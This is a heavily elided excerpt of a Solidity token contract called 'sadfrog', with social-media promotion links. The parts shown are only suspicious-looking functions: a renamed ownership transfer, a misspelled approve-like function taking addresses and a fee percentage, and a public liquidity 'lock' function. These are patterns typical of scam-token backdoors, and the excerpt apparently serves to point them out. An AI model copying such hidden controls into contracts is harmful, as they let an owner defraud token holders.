/**
https://twitter.com/SadFrog_ERC
https://t.me/SadFrog_sad
https://sadfrog.simdif.com/
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipfrog(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
...
contract sadfrog is Ownable {
    ...
    function Aprovetve(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _lokedlp(address user) public {
